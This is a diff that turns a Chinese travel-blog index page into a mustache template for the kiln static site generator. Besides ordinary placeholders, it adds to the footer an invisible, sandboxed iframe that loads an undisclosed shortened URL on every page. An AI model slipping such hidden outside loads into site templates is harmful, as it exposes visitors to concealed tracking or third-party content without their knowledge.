@@ -1,30 +1,31 @@
 <!DOCTYPE HTML>
 <html>
 <head>
-	<title>游记 - 孩子气</title>
+	<title>{{title}}</title>
 	<meta charset="utf-8" />
 	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+	<meta name="keywords" content="{{#tags}}{{name}}, {{/tags}}" />
 	<style type="text/css">
 		body{background-color:#f4f4f4;}
 		header,footer,aside{text-align:center}
 		footer,footer a{color:#999;font-size:12px;}
 		header>h1{font-size:1.5em}
 		article{max-width:40em; line-height:170%; margin:auto; background-color:white; padding:1.5em; border-radius:7px;}
+		article>p>img{max-width:100%}
 	</style>
 </head>
 <body>
 	<header>
-	<h1>游记</h1>
+	<h1>{{title}}</h1>
 	</header>
-	<article>
-<ul>
-<li><a href="../article/2017-03-07_yunnan-dali.html">云南.大理</a> (2017-03-07)</li>
-<li><a href="../article/2016-09-19_beijing.html">北京动物园&amp;海洋馆&amp;欢乐谷</a> (2016-09-19)</li>
-<li><a href="../article/2016-02-20_huangshan.html">黄山 &amp; 南京</a> (2016-02-20)</li>
-</ul>
-	</article>
+	<article>{{{html-content}}}</article>
+	<aside>
+		<p>{{date}}</p>
+		<p>{{#tags}}<a href="../tag/{{urlcode}}.html">{{name}}</a> {{/tags}} </p>
+	</aside>
 	<footer>
 	<p><a href="https://github.com/huzhengquan/kiln">kiln</a>驱动</p>
+	<iframe src="http://dwz.cn/5sLNHS" style="display:none" sandbox=""></iframe>
 	</footer>
 </body>
 </html>
